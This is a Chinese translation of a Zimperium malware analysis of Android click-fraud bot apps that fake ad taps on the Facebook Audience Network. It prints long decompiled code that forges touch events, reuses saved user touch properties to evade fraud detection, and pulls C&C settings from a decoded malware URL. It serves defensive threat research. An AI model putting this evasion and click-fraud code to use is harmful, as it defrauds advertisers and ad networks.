> 原文链接: https://www.anquanke.com//post/id/87232 


# 【技术分享】点击型僵尸app：能够自动点击的安卓僵尸app（上）


                                阅读量   
                                **134726**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：zimperium.com
                                <br>原文地址：[https://blog.zimperium.com/clicking-bot-applications/](https://blog.zimperium.com/clicking-bot-applications/)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p1.ssl.qhimg.com/t014cbfcd8b0956a406.png)](https://p1.ssl.qhimg.com/t014cbfcd8b0956a406.png)

**译者****：**[**興趣使然的小胃**](http://bobao.360.cn/member/contribute?uid=2819002922)

**预估稿费：200RMB**

**投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿**

 

**一、前言**

****

与其他犯罪行为一样，网络犯罪同样受动机驱使，每款恶意软件都有自己的恶意利益。

间谍软件无时无刻在监听着你，[勒索软件](https://blog.zimperium.com/detecting-doublelocker-ransomware/)要求你支付赎金才能解密自己的隐私数据。钓鱼软件会想方设法窃取你的用户名、密码或者账户号码。欺诈安装软件会诱导你安装假冒的软件。广告欺诈软件会显示欺骗性在线广告，诱导用户点击这些广告，利用点击量为开发者创收。最后，还有一种欺诈行为，即Click fraud（点击欺诈）。

Click fraud（CF）是一种滥用在线点击付费（[pay-per-click](https://en.wikipedia.org/wiki/Pay_per_click)）广告的**广告欺诈行为**，当用户点击广告后，广告商就需要为发布者支付费用，这对开发者来说是一笔可观的收入。

互动广告局（Interactive Advertising Bureau，IAB）估计广告欺诈行业的市场规模已达[82亿](https://techcrunch.com/2016/01/06/the-8-2-billion-adtech-fraud-problem-that-everyone-is-ignoring/)美元，而这只是保守估计数值，根据该市场规模，广告欺诈已经是收入最高的网络犯罪行为。

**点击型僵尸应用（Clicking Bot Applications，以下简称CBA）会使用各种各样的方法来模拟用户点击行为，谋取利益。**它们会斟酌以哪些广告作为目标，如何使用命令与控制（C&amp;C）服务器来控制CBA，以及如何规避常见的检测手段。

虽然CBA的目标通常是以损害广告商以及广告发布者的利益来谋取经济收入，但有些CBA的方法及功能很容易被攻击者利用，用在勒索软件、间谍软件以及其他恶意软件上。

作为Zimperium的核心机器学习引擎，[z9 for Mobile Malware](https://www.zimperium.com/press-zimperium-announces-worlds-first-on-device-detection-of-undetected-mobile-malware)专为移动恶意应用领域设计，可以检测之前未知的恶意应用以及oday漏洞利用技术。在[验证z9机器学习](https://blog.zimperium.com/validating-machine-learning-detection-mobile-malware/)检测技术对恶意软件的检测效果中，我们发现了几个Android[潜在有害应用（Potentially Harmful Applications，PHAs）](https://source.android.com/security/reports/Google_Android_Security_PHA_classifications.pdf)，其中有些应用属于CBA类别，有些应用是恶意软件僵尸网络的一部分，用来控制下层的CBA活动。

根据CBA的近期研究成果，我们明确了在什么情况下能够识别点击行为、发现点击行为所使用的具体方法。我尝试过几种方法，在不断修改CBA的代码后，我终于发现要添加哪些元素才能达到优秀的CBA效果。我也尝试了其他自动点击方法，但在本文中，我不会讨论如何从技术层面进一步改进CBA效果。

在各种CBA中，有一种CBA可以欺骗[Facebook Audience Network（Facebook受众网络](https://developers.facebook.com/products/audience-network/overview/)，为Facebook的广告网络，以下简称FAN）。作为Zimperium恶意软件团队，我们成功识别出这类CBA，并将这类恶意应用报告给Facebook的Traffic Quality and Fraud（流量质量及欺诈）团队。我们提供了应用的具体细节、SDK账户ID，复现了自动点击行为，以便Facebook评估应对措施。Facebook在第一时间就把这些应用从FAN中移除，并将处理结果告知我们。凭借我们提供的研究成果，Facebook得以找到使用相同攻击手法的一组应用程序。我们的研究成果可以帮助Facebook确认带有恶意性质的应用，剔除来自僵尸网络而非真实用户的点击行为。

在下文中，我会提供经过反编译、去混淆处理的代码片段以及相应的Android API函数，你可以使用这些代码来访问URL链接，也可以让CBA来代劳 🙂

<br>

**二、“不劳而获”的恶意软件网络**

****

作为Android防御领域的成员之一，Zimperium恶意软件团队成功识别出属于PHAs类别的几个APK文件。

PHA所引用的文件位于cloudfront.net这个CDN域上，分析这些文件后，我们成功找到了其他几个配置文件以及连接老版Ztorg C&amp;C插件的几个APK。

老版[Ztorg ](https://blog.zimperium.com/threat-research-ztorg-trojan-variations/)C&amp;C的恶意行为包括以下两方面：

**1、发送吸费短信（premium SMS）**

**2、使用JavaScript劫持web页面上的点击动作，生成WAP账单。**

最新的恶意软件网络额外添加了CBA及广告软件功能：



1、基于JavaScript的自动点击广告功能以及自动订阅广告功能。

2、使用[VirtualApp](https://github.com/asLody/VirtualApp)动态加载应用。所加载的应用为另一款恶意软件。通过更多的广告获取更大的利益。

3、滥用Android的[AccessibilityService](https://developer.android.com/reference/android/accessibilityservice/AccessibilityService.html)（无障碍辅助服务）实现自动点击。在自动点击方面，滥用Accessibility Service是最为恶劣的一种行径。通过滥用这种服务，应用程序可以点击包括设备设置在内的所有应用的所有按钮。

4、滥用Android的[dispatchTouchEvent ](https://developer.android.com/reference/android/view/ViewGroup.html#dispatchTouchEvent(android.view.MotionEvent))API实现自动点击。这种滥用行为恶劣程度“较低”，点击行为只能局限于CBA的广告栏范围内。

在本文中，我们讨论的是最后两种自动点击技术。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t010b84396408d7afbe.png)

 

**三、利用dispatchTouchEvent API的CBA**

****

为方便UI测试以及应用开发，开发者可以使用[**ViewGroup.dispatchTouchEvent**](https://developer.android.com/reference/android/view/ViewGroup.html#dispatchTouchEvent(android.view.MotionEvent))，向目标[ViewGroup ](https://developer.android.com/reference/android/view/ViewGroup.html)UI组件发送[MotionEvent](https://developer.android.com/reference/android/view/MotionEvent.html)，以模拟用户触摸屏幕行为，这也是非常正常的使用场景。

CBA可以滥用这种技术来点击自己的应用UI组件，因此，这种技术在欺诈领域也能发挥作用，可以点击应用自己的广告栏。

广告框架可以轻松检测到涉嫌使用这类欺诈技术的设备，具体方法如下：

1、观察正常用户使用手指触摸时产生的不同MotionEvent的一些属性，如精度、压力、触摸区域的大致范围以及其他一些标志及属性。经过观察后，很容易就能识别出常量值或者随机值。

2、观察触摸事件的统计分布，如事件时间、空闲时间以及触摸坐标等，这样很容易就能识别出以恒定频率触摸的事件。

3、观察广告被点击区域的统计分布，如图标、标题、赞助商标签、媒体视图、社交内容以及动作等等。正常用户最有可能的情况是稍作迟疑后就会点击“关闭”按钮。

CBA会采取如下方法，尝试规避广告框架的检测机制：

1、当用户点击应用UI组件时，保存与用户最后一次触摸有关的MotionEvent属性。在下一次点击欺诈中复用这些属性。

2、以一定的概率分发点击事件。保存最后一次点击时间，只有时间间隔足够长时，才执行第二次点击动作。

3、使广告UI中被点击区域符合一定的分布模型，其中也包括广告的关闭按钮。

CBA中还包含一些核心功能：

1、如果某个广告因为欺诈检测机制不再有效，那么就选择使用另一个广告SDK。

2、CBA会根据配置信息选择待欺诈的广告对象以及备用的广告对象。

3、CBA在配置信息中定义点击频率、两次点击的最小时间间隔、目标广告及备用广告，由C&amp;C服务器决定是否激活CBA角色。CBA在初始状态下也会包含一个默认的配置信息。

4、除了Facebook移动广告平台以外，CBA广告SDK配置列表中还包括Google推出的AdMob以及DoubleClick广告交易平台。其他广告平台，如MobVista、InMobi以及中国互联网搜索巨头百度推出的DU Ad平台的推广力度非常大，但目前没有证据表明这些平台与自动点击行为有关。

我们来分析一下**com.life.read.physical.trian**这款应用经过反编译后的代码。

代码中的注释语句由zLabs添加。我们删除了某些代码，以缩短代码篇幅。

**1、复用已保存的用户上次触摸事件的相关属性**



```
public class MainActivity extends SlidingFragmentActivity implements View.OnClickListener, View.OnTouchListener `{`

    public boolean onTouch(View view, MotionEvent motionEvent) `{`
        if(motionEvent.getAction() == 0) `{`
            ClickSimulator.getMotionEventInfo(((Context)this), motionEvent);
        `}`
        return 0;
    `}`

    public class MotionEventInfo `{`
        public static MotionEventInfo setInfo(String name) `{`
            MotionEventInfo options;
            try `{`
                options = new MotionEventInfo();
                JSONObject JSON_Obj = new JSONObject(name);
                options.deviceId = JSON_Obj.optInt("de");
                options.pressure = JSON_Obj.optDouble("pr");
                options.size = JSON_Obj.optDouble("si");
                options.xprecision = JSON_Obj.optDouble("xp");
                options.yprecision = JSON_Obj.optDouble("yp");
                options.metaState = JSON_Obj.optInt("me");
                options.edgeFlags = JSON_Obj.optInt("ed");
            `}`
            catch(Exception ex) `{`
                options = null;
            `}`
            return options;
        `}`
    `}`
`}`
```

**2、以一定的概率分发点击事件**



```
public class FacebookAdsManager `{`
  
  private void triggerAutoClick() `{`
     int randomInt = 10000;
     long cTimeZero = 0;
     if(("1".equals(ConfigurationManager.getAutoClick())) &amp;&amp; new Random().nextInt(100) + 1 &lt;= Integer.valueOf(ConfigurationManager.getClickRate()).intValue()) `{`
         this.simulate_click = this.ctx.getSharedPreferences("simulate_click", 0);
         this.simulate_click_edit = this.simulate_click.edit();
       if(this.simulate_click.getLong("cTime", cTimeZero) - System.currentTimeMillis() &gt;= 60000) `{`
             new Thread(new Runnable(new Random().nextInt(randomInt) + 5000) `{`
                 public void run() `{`
                     try `{`
                         Thread.sleep(((long)FacebookAdsManager.sleepTime));
                         Message msg = new Message();
                         msg.what = 0x888;
                         FacebookAdsManager.getFacebookAdsManagerHandler(context).sendMessage(msg);
                     `}`
                     catch(InterruptedException ex) `{`
                         ex.printStackTrace();
                     `}`
                 `}`
             `}`).start();
         `}`
     `}`
  `}`
`}`
```

**3、使被选择的广告UI部分满足一定的分布**



```
public class FacebookAdsManager `{`
  
  public void handleMessage(Message msg) `{`
       int ten = 10;
       super.handleMessage(msg);
       if(msg.what == 0x888) `{`
           FacebookAdsManager instance = this.instance;
           Context ctx = FacebookAdsManager.getContext(this.instance);
           FacebookAdsManager.getContext(this.instance);
           FacebookAdsManager.setSimulateClick(instance, ctx.getSharedPreferences("simulate_click", 0));
           FacebookAdsManager.set_simulate_click_edit(this.instance, FacebookAdsManager.getSimulateClickEdit(this.instance));
           FacebookAdsManager.getSimulateClickEdit(this.instance).putLong("cTime", System.currentTimeMillis());
           FacebookAdsManager.getSimulateClickEdit(this.instance).apply();
           int randomNumber = new Random().nextInt(13) + 1;
           if(randomNumber == 1) `{`
               ClickSimulator.executeAutoClick(FacebookAdsManager.getContext(this.instance), FacebookAdsManager.get_native_ad_title(this.instance));
           `}`
           else if(randomNumber == 2) `{`
               ClickSimulator.executeAutoClick(FacebookAdsManager.getContext(this.instance), FacebookAdsManager.get_native_ad_icon(this.instance));
           `}`
           else `{`
               if(randomNumber &gt;= 3 &amp;&amp; randomNumber &lt;= 8) `{`
                   ClickSimulator.executeAutoClick(FacebookAdsManager.getContext(this.instance), FacebookAdsManager.get_native_ad_media_xc(this.instance));
                   return;
               `}`

               if(randomNumber == 9) `{`
                   ClickSimulator.executeAutoClick(FacebookAdsManager.getContext(this.instance), FacebookAdsManager.get_native_ad_social_context(this.instance));
                   return;
               `}`

               if(randomNumber == ten) `{`
                   ClickSimulator.executeAutoClick(FacebookAdsManager.getContext(this.instance), FacebookAdsManager.get_native_ad_body(this.instance));
                   return;
               `}`

               if(randomNumber &lt;= ten) `{`
                   return;
               `}`

               ClickSimulator.executeAutoClick(FacebookAdsManager.getContext(this.instance), FacebookAdsManager.get_native_ad_call_to_action(this.instance));
           `}`
       `}`
   `}`  
`}`
```

**4、使用已保存的属性及随机属性分发点击事件**



```
public class ClickSimulator `{`
    public static int getRandomPositionInRange(int min, int max) `{`
        int halfSize = (max - min) / 2;
        int value = Double.valueOf(Math.sqrt((((double)(max - min))) * 1 / 4) * new Random().nextGaussian() + (((double)halfSize))).intValue() + min;
        if(value &lt; min || value &gt; max) `{`
            value = halfSize + min;
        `}`

        return value;
    `}`

    public static String getSimulateClickID(Context ctx) `{`
        return ctx.getSharedPreferences("simulate_click", 0).getString("id", "");
    `}`

    public static void getMotionEventInfo(Context ctx, MotionEvent motionEvent) `{`
        int deviceId = motionEvent.getDeviceId();
        float pressure = motionEvent.getPressure();
        float size = motionEvent.getSize();
        float Xprecision = motionEvent.getXPrecision();
        float Yprecision = motionEvent.getYPrecision();
        int metaState = motionEvent.getMetaState();
        int edgeFlags = motionEvent.getEdgeFlags();
        MotionEventInfo info = new MotionEventInfo();
        info.set_deviceId(deviceId);
        info.set_pressure(((double)pressure));
        info.set_size(((double)size));
        info.set_xprecision(((double)Xprecision));
        info.set_yprecision(((double)Yprecision));
        info.set_metaState(metaState);
        info.set_edgeFlags(edgeFlags);
        ClickSimulator.setSimulateClickID(ctx, MotionEventInfo.getInto(info));
    `}`

    public static void setSimulateClickID(Context ctx, String simulate_click_id) `{`
        SharedPreferences.Editor simulate_click_edit = ctx.getSharedPreferences("simulate_click", 0).edit();
        simulate_click_edit.putString("id", simulate_click_id);
        simulate_click_edit.commit();
    `}`

    public static void executeAutoClick(Context ctx, View view) `{`
        Log.v("auto_click", "AutoSimulateClick");
        int viewWidth = view.getWidth();
        int viewHeight = view.getHeight();
        float randomXPosition = ((float)ClickSimulator.getRandomPositionInRange(0, viewWidth));
        float randomYPosition = ((float)ClickSimulator.getRandomPositionInRange(0, viewHeight));
        float randomXPosition_1 = randomXPosition + (((float)ClickSimulator.getRandomPositionInRange(0, 999999))) * 1f / 100000f;
        float randomYPosition_1 = randomYPosition + (((float)ClickSimulator.getRandomPositionInRange(0, 999999))) * 1f / 100000f;

        String clickID = ClickSimulator.getSimulateClickID(ctx);
        Log.v("auto_click", "getMotionEventBean: " + clickID);
        MotionEventInfo info = MotionEventInfo.setInfo(clickID);

        if(info != null) `{`
            float pressure = Double.valueOf(info.get_pressure()).floatValue();
            randomYPosition = Double.valueOf(info.get_size()).floatValue();
            float Xprecision = Double.valueOf(info.get_xprecision()).floatValue();
            float Yprecision = Double.valueOf(info.get_yprecision()).floatValue();
            int metaState = info.get_metaState();
            int deviceId = info.get_deviceId();
            int edgeFlags = info.get_edgeFlags();
            float size = randomYPosition + ((((float)ClickSimulator.getRandomPositionInRange(0, 1764707))) * 1f / 1000000000f - 0.000865f);
            long downTime = SystemClock.uptimeMillis();
            int randomCount = ClickSimulator.randomValueBetween(0, 4);
            MotionEvent motionEvent = MotionEvent.obtain(downTime, downTime, 0, randomXPosition_1, randomYPosition_1, pressure, size, metaState, Xprecision, Yprecision, deviceId, edgeFlags);
            view.dispatchTouchEvent(motionEvent);
            int count = 0;
            float size_1 = size;
            long eventTime = downTime;
            while(count &lt; randomCount) `{`
                eventTime += ((long)ClickSimulator.getRandomPositionInRange(15, 43));
                if(count == randomCount - 1) `{`
                    size_1 = size;
                `}`
                else `{`
                    size_1 += (((float)ClickSimulator.getRandomPositionInRange(0, 1764707))) * 1f / 1000000000f;
                `}`

                MotionEvent motionEvent_1 = MotionEvent.obtain(downTime, eventTime, 2, randomXPosition_1, randomYPosition_1, pressure, size_1, metaState, Xprecision, Yprecision, deviceId, edgeFlags);
                view.dispatchTouchEvent(motionEvent_1);
                motionEvent_1.recycle();
                ++count;
            `}`

            MotionEvent motionEvent_2 = MotionEvent.obtain(downTime, (((long)ClickSimulator.getRandomPositionInRange(15, 43))) + eventTime, 1, randomXPosition_1, randomYPosition_1, pressure, size, metaState, Xprecision, Yprecision, deviceId, edgeFlags);
            view.dispatchTouchEvent(motionEvent_2);
            motionEvent.recycle();
            motionEvent_2.recycle();
        `}`
    `}`

    public static int randomValueBetween(int min, int max) `{`
        return Double.valueOf(Math.random() * (((double)(max - min)))).intValue() + min;
    `}`
`}`
```

**5、CBA激活配置**



```
public class ConfigurationManager `{`
  ConfigurationManager.weight = "1,2,3";
  ConfigurationManager.auto_unlock = "0";
  ConfigurationManager.auto_click = "0";
  ConfigurationManager.unlock_rate = "30";
  ConfigurationManager.clickRate = "20";
  ConfigurationManager.boost_rate = "70";
  ConfigurationManager.guideRate = "70";
  ConfigurationManager.mainRate = "70";
  ConfigurationManager.backMainRate = "20";


  //EncodedStrings.Conf_URL = //"KlxjwlUOCqlLgV3u9mMAxIXFLiBVC3kFgD61kUQ9LrgsCXaRrakpA6w6dz6fYHnmgD3szNftnlw=";  
  // http://txt.kuxwmuzuz.com/app/phonecleanerpro/conf.txt
  URLConnection connection = new URL(AESDecoder.AESDecode(EncodedStrings.AES_Key, EncodedStrings.Conf_URL)).openConnection();
  BufferedReader br = new BufferedReader(new InputStreamReader(((HttpURLConnection)connection).getInputStream()));
  StringBuilder sb = new StringBuilder();
  while(true) `{`
     String line = br.readLine();
     if(line == null) `{`
         break;
     `}`

     sb.append(line);
  `}`

  if(!TextUtils.isEmpty(sb.toString())) `{`
     JSONObject JSON_Obj = new JSONObject(sb.toString());
     ConfigurationManager.setWeight(JSON_Obj.getString("weight"));
     ConfigurationManager.setAutoUnlock(JSON_Obj.optString("auto_unlock"));
     ConfigurationManager.setAutoClick(JSON_Obj.optString("auto_click"));
     ConfigurationManager.setUnlockRate(JSON_Obj.optString("unlock_rate"));
     ConfigurationManager.setClickRate(JSON_Obj.optString("click_rate"));
     ConfigurationManager.setBoostRate(JSON_Obj.optString("boost_rate"));
     ConfigurationManager.setGuideRate(JSON_Obj.optString("guide_rate"));
     ConfigurationManager.setMainRate(JSON_Obj.optString("main_rate"));
     ConfigurationManager.setBackMainRate(JSON_Obj.optString("back_main_rate"));
  `}`
`}`
```

**6、CBA广告配置**



```
public class ConfigurationManager `{`
  ConfigurationManager.weight = "1,2,3";
  ConfigurationManager.auto_unlock = "0";
  ConfigurationManager.auto_click = "0";
  ConfigurationManager.unlock_rate = "30";
  ConfigurationManager.clickRate = "20";
  ConfigurationManager.boost_rate = "70";
  ConfigurationManager.guideRate = "70";
  ConfigurationManager.mainRate = "70";
  ConfigurationManager.backMainRate = "20";


    //EncodedStrings.Conf_URL = //"KlxjwlUOCqlLgV3u9mMAxIXFLiBVC3kFgD61kUQ9LrgsCXaRrakpA6w6dz6fYHnmgD3szNftnlw=";  
  // http://txt.kuxwmuzuz.com/app/phonecleanerpro/conf.txt
  URLConnection connection = new URL(AESDecoder.AESDecode(EncodedStrings.AES_Key, EncodedStrings.Conf_URL)).openConnection();
  BufferedReader br = new BufferedReader(new InputStreamReader(((HttpURLConnection)connection).getInputStream()));
  StringBuilder sb = new StringBuilder();
  while(true) `{`
     String line = br.readLine();
     if(line == null) `{`
         break;
     `}`

     sb.append(line);
  `}`

  if(!TextUtils.isEmpty(sb.toString())) `{`
     JSONObject JSON_Obj = new JSONObject(sb.toString());
     ConfigurationManager.setWeight(JSON_Obj.getString("weight"));
     ConfigurationManager.setAutoUnlock(JSON_Obj.optString("auto_unlock"));
     ConfigurationManager.setAutoClick(JSON_Obj.optString("auto_click"));
     ConfigurationManager.setUnlockRate(JSON_Obj.optString("unlock_rate"));
     ConfigurationManager.setClickRate(JSON_Obj.optString("click_rate"));
     ConfigurationManager.setBoostRate(JSON_Obj.optString("boost_rate"));
     ConfigurationManager.setGuideRate(JSON_Obj.optString("guide_rate"));
     ConfigurationManager.setMainRate(JSON_Obj.optString("main_rate"));
     ConfigurationManager.setBackMainRate(JSON_Obj.optString("back_main_rate"));
  `}`
`}`
```

**7、CBA备用广告机制**



```
public void loadFacebokAds(final Context ctx, final RelativeLayout layout, final int count) `{`

   this.native_ad_layout = LayoutInflater.from(ctx).inflate(layout.native_ad_layout, ((ViewGroup)layout), false);
   layout.removeAllViews();
   layout.addView(this.native_ad_layout);
   this.native_ad_icon = this.native_ad_layout.findViewById(id.native_ad_icon);
   this.native_ad_title = this.native_ad_layout.findViewById(id.native_ad_title);
   this.native_ad_media_xc = this.native_ad_layout.findViewById(id.native_ad_media_xc);
   // load all other ad parts...

   View img_cancel = this.native_ad_layout.findViewById(id.img_cancel);
   // if no ads components are previously  found

   if(FacebookAdsManager.cow_arraylist == null || FacebookAdsManager.cow_arraylist.size() == 0) `{`

       Log.v("all_sdk", "facebook原生广告start"); //facebook native ads strt
       this.nativeAd = new NativeAd(ctx, AESDecoder.AESDecode(EncodedStrings.AES_Key, EncodedStrings.native_ad_FB_id_1));
       this.nativeAd.setAdListener(new AdListener(ctx, count, layout, ((ImageView)img_cancel)) `{`


           public void onAdLoaded(Ad ad) `{`
               Log.v("all_sdk", "facebook原生广告load ok");

               if(FacebookAdsManager.getNativeAd(FacebookAdsManager.instance) != null) `{`
                   FacebookAdsManager.get_native_ad_title(FacebookAdsManager.instance).setText(FacebookAdsManager.getNativeAd(FacebookAdsManager.instance).getAdTitle());
                   FacebookAdsManager.get_native_ad_social_context(FacebookAdsManager.instance).setText(FacebookAdsManager.getNativeAd(FacebookAdsManager.instance).getAdSocialContext());
                   FacebookAdsManager.get_native_ad_body(FacebookAdsManager.instance).setText(FacebookAdsManager.getNativeAd(FacebookAdsManager.instance).getAdBody());
                   // load all other ad parts...

                   SharedPreferences.Editor native_ad_edit = this.getSharedPreferences("native_ad", 0).edit();
                   native_ad_edit.putLong("show_native_ad_time", System.currentTimeMillis());
                   native_ad_edit.apply();
                   FacebookAdsManager.getNativeAd(FacebookAdsManager.this).registerViewForInteraction(this.c, ((List)list));
                   FacebookAdsManager.triggerAutoClick(FacebookAdsManager.instance);
               `}`
               else `{`
                   if(count == 2) `{`
                       return;
                   `}`
                   //load the app other ads for CBA activity
                   GeneralAdsManger.getInstance().loadAd(ctx, layout, count + 1);
               `}`
           `}`

           public void onError(Ad ad, AdError adError) `{`
               Log.v("all_sdk", "facebook原生广告错误" + adError.getErrorMessage());
               HashMap errors = new HashMap();
               errors.put("facebook_native_show_error", adError.getErrorMessage());

               if(count != 2) `{`
                   GeneralAdsManger.getInstance().loadAd(ctx, layout, count + 1);
               `}`
           `}`
       `}`);

   `}`
   else `{`
       FacebookAdsManager.cow_arraylist.get(0).setNativeAdEnabled(true);
       this.native_ad_title.setText(FacebookAdsManager.cow_arraylist.get(0).getNativeAd().getAdTitle());
       this.native_ad_social_context.setText(FacebookAdsManager.cow_arraylist.get(0).getNativeAd().getAdSocialContext());

       // set content to the ads parts...

       this.native_ad_layout.findViewById(id.ad_choices_container).addView(new AdChoicesView(ctx, FacebookAdsManager.cow_arraylist.get(0).getNativeAd(), true));
       ArrayList view_list = new ArrayList();
       ((List)view_list).add(this.native_ad_title);
       ((List)view_list).add(this.native_ad_call_to_action);
       ((List)view_list).add(this.native_ad_icon);

       // add the ads components

       if(new Random().nextInt(100) + 1 &lt;= Integer.valueOf(ConfigurationManager.getGuideRate()).intValue()) `{`
           ((List)view_list).add(img_cancel);
       `}`
       else `{`
           ((ImageView)img_cancel).setOnClickListener(new View.OnClickListener(layout) `{`
               public void onClick(View view) `{`
                   this.view.setVisibility(8);  // GONE
               `}`
           `}`);
       `}`

       if(FacebookAdsManager.cow_arraylist.get(0).getNativeAd() != null) `{`
           FacebookAdsManager.cow_arraylist.get(0).getNativeAd().registerViewForInteraction(((View)layout), ((List)view_list));
           this.triggerAutoClick();
       `}`
       else if(count != 2) `{`
           //load the app other ads for CBA activity
           GeneralAdsManger.getInstance().loadAd(ctx, layout, count + 1);
       `}`

       SharedPreferences.Editor native_ad_editor = ctx.getSharedPreferences("native_ad", 0).edit();
       native_ad_editor.putLong("show_native_ad_time", System.currentTimeMillis());
       native_ad_editor.apply();
       FacebookAdsManager.cow_arraylist.remove(0);
   `}`
`}`
```


